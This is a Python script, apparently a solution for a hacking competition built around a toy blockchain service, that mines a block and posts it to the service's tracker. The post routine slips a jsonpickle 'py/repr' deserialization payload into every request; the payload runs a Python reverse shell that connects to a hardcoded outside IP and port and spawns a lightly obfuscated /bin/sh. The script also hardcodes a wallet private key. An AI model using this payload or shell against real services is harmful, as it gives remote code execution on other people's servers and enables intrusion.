import exchange
import blockchain
import miner
import utils
import datetime
import jsonpickle
import requests
import json

REWARD = 100_000_000
NODE_SERVER = "https://hackcrypto.hackwsb.net"
USERNAME = "storrealbac_e10e93"
WALLET_ADDRESS = "e7d9c8deec017a01febc223e19a42e4f8d93aa1cc63eff8fc784f85155efaa12"
WALLET_PRIVATE = "a309ece2d7c2c18859d806a8748a531e1871285fcd4cd922a9caba7dfd82fff7"
PREVIOUS_HASH = input(">>> ")

CODE = """
import socket, os, pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("91.192.10.53", 4242))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("\\x2f" + "bin" + "\\x2f" + "sh")
""".strip().replace("\n", ";")

EXPLOIT = f"os/exec('{CODE}')"


def try_mine(block: blockchain.Block) -> bool:
    block.nonce += 1
    return block.is_valid()


def mine(block: blockchain.Block):
    print("Mining now with %i transactions." % len(block.transactions))
    hashes_done = 0

    start = datetime.datetime.now()
    while not try_mine(block):
        hashes_done += 1

        if hashes_done % 300000 == 0:
            end = datetime.datetime.now()
            seconds = (end - start).total_seconds()

            print("Hash Rate: %i hashes/second      \r" % (300000 / seconds),)
            
            start = datetime.datetime.now()

    print("Mined block:", block.get_hash(), "with nonce", block.nonce)


def jsonpickle_decode(text):
    return jsonpickle.decode(text.replace("hackbase.client.", ""))


def post_route(route, data=None):
    endpoint = "%s/u/%s/tracker/%s" % (
        NODE_SERVER,
        USERNAME,
        route
    )

    try:
        encoded = jsonpickle.encode(data)
        encoded = json.loads(encoded)
        encoded["1"] = {"py/repr": EXPLOIT}
        encoded = json.dumps(encoded)

        r = requests.post(endpoint, data=encoded)

        return jsonpickle_decode(r.text) #type: ignore
    except Exception as e:
        print(f"failed request: {route}, error: {e}")
        return None


reward = blockchain.Transaction(
    id=utils.gen_uuid(),
    sender="mined",
    receiver=WALLET_ADDRESS,
    value=10,
    signature=""
)
reward.sign(WALLET_PRIVATE)

block = blockchain.Block(
    transactions=[reward],
    previous_hash=PREVIOUS_HASH,
    miner=USERNAME
)

mine(block)

resp = post_route("add", data=block)
print(f"RESP: {resp}")
if resp and resp["success"]:
    print("Block added!")
